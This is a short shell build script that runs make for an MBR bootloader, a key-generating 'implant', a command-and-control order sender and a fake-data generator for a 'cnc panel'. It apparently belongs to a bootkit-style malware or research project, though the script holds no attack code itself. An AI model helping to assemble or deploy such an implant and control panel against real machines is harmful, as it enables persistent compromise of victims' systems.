#!/bin/sh

# Compile bootloader
make -C mbr re
# Generate keys and compile implant, depends on the bootloader
# Also copy the private key to the cnc panel
make -C implant re
# Compile the cnc executor
make -C cnc/send_order re
# Generate fake data to populate the cnc panel
make -C cnc/generate_fake_db re
